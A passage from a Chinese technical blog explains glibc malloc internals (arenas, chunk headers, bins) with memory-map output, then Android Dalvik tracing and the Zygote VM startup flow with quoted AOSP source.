class="line">    &#125;</span><br><span class="line">    ret = pthread_join(t1, &amp;s);</span><br><span class="line">    <span class="keyword">if</span> (ret) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Thread join error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>输出分析</strong><br>主线程的malloc之前，没有堆段，也没有每个线程的栈，因为thread1还没有创建。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;per_thread_arena</span><br><span class="line">Welcome to per thread arena example::3437</span><br><span class="line">Before malloc in main thread</span><br><span class="line"></span><br><span class="line"># another terminal</span><br><span class="line">$ cat &#x2F;proc&#x2F;3437&#x2F;maps</span><br><span class="line">...</span><br><span class="line">08048000-08049000 r-xp 00000000 08:02 3680065                            &#x2F;home&#x2F;fanrong&#x2F;Computer&#x2F;pwn&#x2F;heap-overflow&#x2F;sploitfun&#x2F;per_thread_arena</span><br><span class="line">08049000-0804a000 r--p 00000000 08:02 3680065                            &#x2F;home&#x2F;fanrong&#x2F;Computer&#x2F;pwn&#x2F;heap-overflow&#x2F;sploitfun&#x2F;per_thread_arena</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:02 3680065                            &#x2F;home&#x2F;fanrong&#x2F;Computer&#x2F;pwn&#x2F;heap-overflow&#x2F;sploitfun&#x2F;per_thread_arena</span><br><span class="line">f755a000-f755b000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>主线程的malloc之后，堆段创建，主线程的堆内存由<code>brk</code>系统调用创建。尽管用户请求了1000bytes，但却创建了132KB的堆内存。这个连续的堆内存称为<code>arena</code>，因为由主线程创建，所以叫它<code>main arena</code>。后续的分配请求会接着用这个arena直到用完空闲空间，它可以通过增加<code>program break location</code>来增长(并调整<code>Top Chunk</code>的大小)。当Top Chunk有大量的空闲空间时arena也可以缩小。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">After malloc and before free in main thread</span><br><span class="line">...</span><br><span class="line">0986e000-0988f000 rw-p 00000000 00:00 0                                  [heap]</span><br><span class="line">f7536000-f7537000 rw-p 00000000 00:00 0</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>主线程的free之后，分配的内存区域没有释放给操作系统，而是是释放给<code>glibc malloc</code>，glibc malloc把这个空闲的块加到main arena的<code>bin</code>（glibc malloc中，freelist数据结构称为bin）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">After free in main thread</span><br><span class="line">...</span><br><span class="line">0986e000-0988f000 rw-p 00000000 00:00 0                                  [heap]</span><br><span class="line">f7536000-f7537000 rw-p 00000000 00:00 0</span><br></pre></td></tr></table></figure>
<p>thread1的malloc之前，thread1没有堆段，但是有栈了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Before malloc in thread 1</span><br><span class="line">...</span><br><span class="line">f6d36000-f7537000 rw-p 00000000 00:00 0                                  [stack:3904]</span><br></pre></td></tr></table></figure>
<p>thread1的malloc之后，thread1的堆（f6c00000-f6c21000大小为132KB）创建了，与主线程不同，它是由<code>mmap</code>创建，称为<code>thread arena</code>。</p>
<blockquote>
<p>用户请求的大小大于128KB时，内存分配由mmap系统调用完成（而不是sbrk），不管是请求是main arena发出的还是thread arena发出的。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">After malloc and before free in thread 1</span><br><span class="line">...</span><br><span class="line">0986e000-0988f000 rw-p 00000000 00:00 0                                  [heap]</span><br><span class="line">f6c00000-f6c21000 rw-p 00000000 00:00 0</span><br><span class="line">f6c21000-f6d00000 ---p 00000000 00:00 0</span><br><span class="line">f6d35000-f6d36000 ---p 00000000 00:00 0</span><br></pre></td></tr></table></figure>
<p>thread1的free之后，分配的内存没有释放给操作系统，而是释放给<code>glibc malloc</code>，glibc malloc把这个空闲块加到thread arena的<code>bin</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">After free in thread 1</span><br><span class="line">...</span><br><span class="line">0986e000-0988f000 rw-p 00000000 00:00 0                                  [heap]</span><br><span class="line">f6c00000-f6c21000 rw-p 00000000 00:00 0</span><br><span class="line">f6c21000-f6d00000 ---p 00000000 00:00 0</span><br><span class="line">f6d35000-f6d36000 ---p 00000000 00:00 0</span><br></pre></td></tr></table></figure>
<p><strong>Arena</strong><br>arena的数量由系统的核数量决定。</p>
<blockquote>
<p>32位系统：<br>arena的数量 = 2 * 核的数量<br>64位系统：<br>arena的数量 = 8 * 核的数量</p>
</blockquote>
<p><strong>Multiple Arena</strong><br>例如：一个多线程（主线程+3个用户线程）应用在一个单核的32位系统上运行，线程数&gt;2*核数，因此glibc malloc需要确保multiple arena能被线程共享。</p>
<ul>
<li>主线程第一次调用malloc会创建main arena。</li>
<li>thread1和thread2第一次调用malloc，会分别为它们创建thread arena</li>
<li>thread3第一次调用malloc不会创建arena，会尝试reuse已存在的arena（main arena或arena1或arena2）</li>
<li>reuse：<br>当循环可用的arena时，尝试lock arena<br>如果lock成功，返回那个arena给用户<br>如果没有空闲的arena，阻塞排队等待arena</li>
</ul>
<p><strong>Multiple Heaps</strong><br>glibc malloc中有三种数据结构：<br><code>heap_info</code>Heap Header - 一个thread arena可以有multiple heaps，每个heap有自己的header。（每个thread arena一开始只有一个heap，当堆段空间用尽时，会有新的heap被mmap到这个arena中）<br><code>malloc_state</code>Arena Header - 一个thread arena的multiple heaps只有一个arena header。Arena header包含着bins，top chunk，last remainder chunk等信息。<br><code>malloc_chunk</code>Chunk Header - 一个heap根据用户请求被分成多个chunk，每个chunk有自己的header。</p>
<blockquote>
<p>Main arena没有multiple heaps，因此没有heap_info结构。当main arena空间用尽时，sbrk创建的堆段会被增长（连续空间），直到它撞到内存映射段。<br>和thread arena不同，main arena的arena header不是sbrk创建的堆段的一部分，它是一个全局变量，因此它在libc.so的数据段。</p>
</blockquote>
<p>main arena和thread arena（单个堆段）<br><img src="/images/glibcmalloc/threadandmain.png"><br>thread arena（多个堆段）<br><img src="/images/glibcmalloc/threadarena.png"><br><strong>Chunk</strong>堆段中chunk的类型：</p>
<ul>
<li>Allocated chunk</li>
<li>Free chunk</li>
<li>Top chunk</li>
<li>Last Remainder chunk</li>
</ul>
<p><strong>Allocated Chunk</strong><br><img src="/images/glibcmalloc/allocatedchunk.png"><br><code>prev_size</code>如果前一个chunk被free，这个成员包含前一个chunk的大小，如果前一个chunk被分配，这个域包含前一个chunk的用户数据。<br><code>size</code>这个成员包含当前chunk的大小，最后三个字节包含了标识位信息。</p>
<ul>
<li>PREV_INUSE(P) - 前一个chunk被分配时，设置这一位。</li>
<li>IS_MMAPPED(M) - 当chunk是mmap创建的，设置这一位。</li>
<li>NON_MAIN_ARENA(N) - 当chunk属于一个thread arena时，设置这一位。</li>
</ul>
<p><strong>Free Chunk</strong><br><img src="/images/glibcmalloc/freechunk.png"><br><code>prev_size</code>没有两个free chunk是相连的，当两个chunk都是free的，它们会合并成一个free chunk，因此free chunk的前一个chunk一定是allocated chunk，这个域一定包含用户数据。<br><code>size</code>包含这个free chunk的大小。<br><code>fd</code>指向相同bin里的下一个chunk（而不是物理内存中的下一个chunk）。<br><code>bk</code>指向相同bin里的前一个chunk（而不是物理内存中的前一个chunk）。<br><strong>Bins</strong>是free list数据结构，它们被用来保存free chunk。基于chunk的大小分为：</p>
<ul>
<li>Fast bin</li>
<li>Unsorted bin</li>
<li>Small bin</li>
<li>Large bin</li>
</ul>
<p>用于保存bin的数据结构：<br><code>fastbinsY</code>这个数组保存fast bin。<br><code>bins</code>这个数组保存unsorted，small和large bin，总共有126个bin：</p>
<ul>
<li>Bin 1 - Unsorted bin</li>
<li>Bin 2 to Bin 63 - Small bin</li>
<li>Bin 64 to Bin 126 - Large bin</li>
</ul>
<p><strong>Fast Bin</strong> 16~80bytes大小的chunk被称为fast chunk。保存fast chunk的bin叫做fast bin，fast bin在内存中分配和回收更快。</p>
<ul>
<li>bin的数量 - 10<br>每个fast bin包含一个free chunk的单向链表，单项链表的增加和删除都在链表头（LIFO）。</li>
<li>Chunk size - 以8字节区分<br>例如，第一个fast bin（index 0）包含16字节chunk的binlist，第二个fast bin（index 1）包含24字节chunk的binlist …<br>同一个fast bin的chunk一样大小。</li>
</ul>
<p><img src="/images/glibcmalloc/fastbin.png"></p>
<ul>
<li>在malloc初始化阶段，fast bin最大64字节（而不是80），因此默认16~64字节的chunk是fast chunk。</li>
<li>不合并 - 两个相连的free chunk不会合并成一个，这会产生更多碎片，但是free的速度提高了。</li>
</ul>
<p><strong>Unsorted Bin</strong> 当small或large chunk free以后，不会把它们加到期望的bin，而是加到unsorted bin。这种方法使<code>glibc malloc</code>能重用最近free的chunk，使内存的分配和回收加速（因为减少了查找合适bin的时间）。</p>
<ul>
<li>bin的数量 - 1<br>unsorted bin包含一个free chunk的循环双向链表。</li>
<li>Chunk size - 没有大小限制</li>
</ul>
<p><img src="/images/glibcmalloc/unsortedbin.png"><br><strong>Small Bin</strong> 小于512字节的chunk称为small chunk，保存small chunk的bin称为small bin。small bin的分配与回收比large bin快（没有fast bin快）。</p>
<ul>
<li>bin数量 - 62<br>small bin包含free chunk的循环双向链表，双向链表的增加在开头，删除在末尾（FIFO）。</li>
<li>Chunk Size - 以8字节区分<br>例如，第一个small bin（Bin 2）保存一个16字节chunk的binlist，第二个smallbin（Bin 3）保存一个24字节chunk的binlist …<br>同一个small bin里的chunk大小相同。</li>
<li>合并 - 两个相邻的free chunk会合并成一个。合并减少了碎片，但使free速度减慢。</li>
</ul>
<p><strong>Large Bin</strong> 大小大于等于512的chunk称为large chunk。保存large chunk的bin称为large bin。</p>
<ul>
<li>bin的数量 - 63<br>large bin包含一个free chunk的循环双向链表。<br>chunk的增加和删除可以在链表的任何位置。</li>
<li>合并 - 两个相邻的free chunk会合并成一个。</li>
</ul>
<p><strong>Top Chunk</strong><br>在arena顶部的chunk称为top chunk，它不属于任何bin。Top chunk会在所有bin都没有空闲区域的时候使用。Top chunk大于用户请求时分成两部分：</p>
<ul>
<li>用户chunk</li>
<li>Remainder chunk</li>
</ul>
<p>Remainder chunk变成新的top，top chunk小于用户请求，会通过<code>sbrk</code>(main arena)或<code>mmap</code>(thread arena)系统调用增加。<br><strong>Last Remainder Chunk</strong> 最近从small请求中分离出来的。<br><strong>reference</strong><br><a target="_blank" rel="noopener" href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/">https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2016/04/05/Dalvik%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2016/04/05/Dalvik%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B/" class="post-title-link" itemprop="url">Dalvik虚拟机执行流程</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2016-04-05 11:13:11" itemprop="dateCreated datePublished" datetime="2016-04-05T11:13:11+08:00">2016-04-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="trace使用"><a href="#trace使用" class="headerlink" title="trace使用"></a>trace使用</h2><p>(1) 在代码中加入调试命令</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.dalviktestapp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.app.Activity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.os.Debug;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        test();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 调用Android调试模式下的调试方法</span></span><br><span class="line">        Debug.startMethodTracing(<span class="string">&quot;/sdcard/test&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello Dalvik&quot;</span>);</span><br><span class="line">        Debug.stopMethodTracing();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>(2) 在<code>AndroidMenifest.xml</code>文件中加入权限</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">uses-permission</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.MOUNT_UNMOUNT_FILESYSTEMS&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">uses-permission</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>(3) 右键项目-&gt;Debug As-&gt;Android Application，会在sdcard目录下生成trace文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ adb pull &#x2F;sdcard&#x2F;test.trace . &#x2F;&#x2F; 拷贝到本地</span><br><span class="line">$ traceview test.trace &#x2F;&#x2F; 用traceview查看</span><br></pre></td></tr></table></figure>
<p>可以看到程序中每个线程调用方法的启动和停止时间，分析程序的每一步流程，定位存在问题的代码。<br><img src="/images/androiddalvik/traceview.png"></p>
<h2 id="Dalvik虚拟机执行流程"><a href="#Dalvik虚拟机执行流程" class="headerlink" title="Dalvik虚拟机执行流程"></a>Dalvik虚拟机执行流程</h2><p>Dalvik虚拟机各部分功能：<br><strong>线程管理：</strong>进程隔离和线程管理，每一个Android应用在底层都会对应一个独立的Dalvik虚拟机实例，所有的Android应用的线程都对应一个Linux线程，进程管理依赖于Zygote机制。<br><strong>类加载：</strong>解析Dex文件并加载Dalvik字节码。<br><strong>解释器：</strong>根据自身的指令集Dalvik ByteCode解释字节码。<br><strong>内存管理：</strong>分配系统启动初始化和应用程序运行时需要的内存资源。<br><strong>即时编译(Just-In-Time, JIT)：</strong>在解释时动态地编译程序，以缓解解释器的低效工作。<br><strong>本地方法调用(Java Native Interface, JNI)：</strong>一套编程框架标准接口，允许Java代码和本地代码互相调用。<br><strong>反射机制实现模块：</strong>允许程序在运行时透过Reflection API取得任何一个已知名称的类的内部信息，包括其描述符、超类、实现的接口，也包括属性和方法等所有信息，并可于运行时改变属性内容或调用内部方法。<br><strong>调试支撑模块：</strong>Dalvik VM支持许多常见开发环境下的代码级调试，任何允许<code>JDWP（Java Debug Wire Protocol——Java 调试线协议）</code>下远程调试的工具都可以使用，其支持的调试器包括jdb、Eclipse、IntelliJ和JSwat。</p>
<h3 id="Dalvik虚拟机运行在ARM平台的入口点"><a href="#Dalvik虚拟机运行在ARM平台的入口点" class="headerlink" title="Dalvik虚拟机运行在ARM平台的入口点"></a>Dalvik虚拟机运行在ARM平台的入口点</h3><p>Dalvik虚拟机运行在ARM平台时，是从初始化进程加载的服务<code>Zygote</code>开始的。Zygote进程通过调用<code>startVm</code>来创建虚拟机。在这个函数中主要通过调用<code>JNI_CreateJavaVM()</code>来创建虚拟机。<br><strong>代码清单</strong> framework/base/core/jni/AndroidRuntime.cpp: startVm()</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> AndroidRuntime::startVm(JavaVM** pJavaVM, JNIEnv** pEnv)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (JNI_CreateJavaVM(pJavaVM, pEnv, &amp;initArgs) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        LOGE(<span class="string">&quot;JNI_CreateJavaVM failed\n&quot;</span>);</span><br><span class="line">        goto bail;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Dalvik虚拟机的入口点通过调用<code>JNI_CreateJavaVM()</code>函数来完成虚拟机的创建。<code>Java_CreateJavaVM</code>所完成的主要工作如下。<br>(1) 检查<code>JNI</code>版本是否正确；<br>(2) 解析命令行参数，初始化<code>JNIEnv</code>和<code>JavaVM</code>全局变量；<br>(3) 初始化全局变量<code>gDvm</code>；<br>(4) 调用<code>dvmStartup</code>初始化虚拟机的各个模块，包括初始化<code>垃圾收集器(GC)</code>、<code>类加载器</code>、<code>字节码校验模块</code>和<code>解释器</code>等，完成各模块的初始化后创建一个线程；<br>(5) 装载Dalvik虚拟机运行时核心类库并校验字节码。<br>JNI_CreateJavaVM函数的实现在文件dalvik/vm/Jni.cpp里<br><strong>代码清单</strong> dalvik/vm/Jni.cpp: JNI_CreateJavaVM()</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">jint <span class="title">JNI_CreateJavaVM</span><span class="params">(JavaVM** p_vm, JNIEnv** p_env, <span class="keyword">void</span>* vm_args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> JavaVMInitArgs* args = (JavaVMInitArgs*) vm_args;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">/* 初始化VM */</span></span><br><span class="line">    gDvm.initializing = <span class="literal">true</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> status = </span><br><span class="line">        dvmStartup(argc, argv.get(), args-&gt;ignoreUnrecognized, (JNIEnv*)pEnv);</span><br><span class="line">    gDvm.initializing = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (!status.empty()) &#123;</span><br><span class="line">        <span class="built_in">free</span>(pEnv);</span><br><span class="line">        <span class="built_in">free</span>(pVM);</span><br><span class="line">        LOGW(<span class="string">&quot;CreateJavaVM failed: %s&quot;</span>, status.c_str());</span><br><span class="line">        <span class="keyword">return</span> JNI_ERR;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Success! Return stuff to caller */</span></span><br><span class="line">    dvmChangeStatus(<span class="literal">NULL</span>, THREAD_NATIVE);</span><br><span class="line">    *p_env = (JNIEnv*) pEnv;</span><br><span class="line">    *p_vm = (JavaVM*) pVM;</span><br><span class="line">    ALOGV(<span class="string">&quot;CreateJavaVM successded&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> JNI_OK;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Zygote进程"><a href="#Zygote进程" class="headerlink" title="Zygote进程"></a>Zygote进程</h3><p>Zygote进程是由<code>init进程</code>根据<code>system/core/rootdir/init.rc</code>文件中的配置项创建的，init进程是系统启动后运行在用户空间的首个进程。init进程启动完系统所需的各种Daemon线程后，启动Zygote进程。Zygote进程启动后，Android的应用程序都由Zygote进程启动运行。Zygote主要负责：<br>(1) 启动系统服务<code>system_server</code>进程（Android绝大多数系统服务的守护进程）。<br>(2) 创建子进程运行Android应用程序。<br>Zygote工作流程：<br>(1) 系统init进程创建Zygote进程，通过执行app_process程序，开启Zygote进程。<br>(2) app_process生成<code>AppRuntime</code>对象，分析其主函数传递过来的参数，传递给AppRuntime对象，调用对象的start方法，在start中完成了以下三件事。</p>
<ul>
<li>调用<code>startVm</code>注册虚拟机。在其中通过调用JNI_CreateJavaVM()创建虚拟机。</li>
<li>调用<code>startReg</code>注册JNI函数。注册虚拟机要使用的JNI函数，这样运行在虚拟机中的Java类就可以调用本地函数了。</li>
<li>调用<code>ZygoteInit类</code>的main函数，运行ZygoteInit类（位于framework/base/core/java/com/android/internal/os/ZygoteInit.java）。</li>
</ul>
<p>(3) <code>ZygoteInit</code>是Zygote的main函数入口，是Zygote的核心类，完成了Zygote的职责，其执行流程如下。</p>
<ul>
<li>调用<code>registerZygoteSocket</code>函数创建了一个socket接口，绑定socket套接字，接收新的Android应用程序运行请求。</li>
<li>调用<code>preloadClasses</code>和<code>preloadResource</code>函数加载Android application framework使用的类和资源。</li>
<li>调用<code>startSystemServer</code>函数来启动<code>SystemServer</code>组件。在startSystemServer中调用<code>forkSystemServer()</code>来创建出一个名为<code>system_server</code>的进程，这个进程调用<code>com.android.server.SystemServer</code>的main函数，启动各项系统服务，并最终将调用线程加入到Binder通信系统。<code>system_server</code>是系统Service所驻留的进程，该进程是framework的核心。</li>
<li>Zygote从startSystemServer函数返回后，调用<code>runSelectLoopMode</code>函数进入一个无限循环，监听socket接口等待新的应用程序请求。</li>
</ul>
<p>Zygote可以创建三种进程：fork<code>Zygote子进程</code>，forkSystemServer<code>system_server进程</code>，forkAndSpecialize<code>非Zygote子进程</code>。<br>三种创建进程的方法根据JNI机制均对应有native方法，位于dalvik/vm/native/dalvik_system_Zygote.cpp文件中：<br>(1) fork<br><strong>代码清单</strong> dalvik/vm/native/dalvik_system_Zygote.cpp: Dalvik_dalvik_system_Zygote_fork()</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* native public static int fork(); */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Dalvik_dalvik_system_Zygote_fork</span><span class="params">(<span class="keyword">const</span> u4* args, JValue* pResult)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="comment">// 判断当前虚拟机是否支持Zygote</span></span><br><span class="line">    <span class="keyword">if</span> (!gDvm.zygote) &#123;</span><br><span class="line">        dvmThrowIllegalStateException(</span><br><span class="line">            <span class="string">&quot;VM instance not started with -Xzygote&quot;</span>);</span><br><span class="line">        RETURN_VOID();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 判断堆创建是否成功，不成功则停止虚拟机</span></span><br><span class="line">    <span class="keyword">if</span> (!dvmGcPreZygoteFork()) &#123;</span><br><span class="line">        ALOGE(<span class="string">&quot;pre-fork heap failed&quot;</span>);</span><br><span class="line">        dvmAbort();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 设置信号机制</span></span><br><span class="line">    setSignalHandler();</span><br><span class="line">    <span class="comment">// 记录日志信息</span></span><br><span class="line">    dvmDumpLoaderStats(<span class="string">&quot;zygote&quot;</span>);</span><br><span class="line">    pid = fork();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_ANDROID_OS</span></span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* child process */</span></span><br><span class="line">        <span class="keyword">extern</span> <span class="keyword">int</span> gMallocLeakZygoteChild;</span><br><span class="line">        gMallocLeakZygoteChild = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    RETURN_INT(pid);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>新进程复制父进程的资源，新的Zygote进程的虚拟机参数中支持Zygote标记参数gDvm.zygote也为true，因而也可以fork子进程。<br>(2) forkSystemServer()<br><strong>代码清单</strong> dalvik/vm/native/dalvik_system_Zygote.cpp: Dalvik_dalvik_system_Zygote_forkSystemServer()</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * native public static int nativeForkSystemServer(int uid, int gid,</span></span><br><span class="line"><span class="comment"> *     int[] gids, int debugFlags, int[][] rlimits,</span></span><br><span class="line"><span class="comment"> *     long permittedCapabilities, long effectiveCapabilities);</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Dalvik_dalvik_system_Zygote_forkSystemServer</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">const</span> u4* args, JValue* pResult)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="comment">// 根据参数，fork一个子进程</span></span><br><span class="line">    pid = forkAndSpecializeCommon(args, <span class="literal">true</span>);</span><br><span class="line">    <span class="comment">/* The zygote process checks whether the child process has died or not. */</span></span><br><span class="line">    <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> status;</span><br><span class="line">        ALOGI(<span class="string">&quot;System server process %d has been 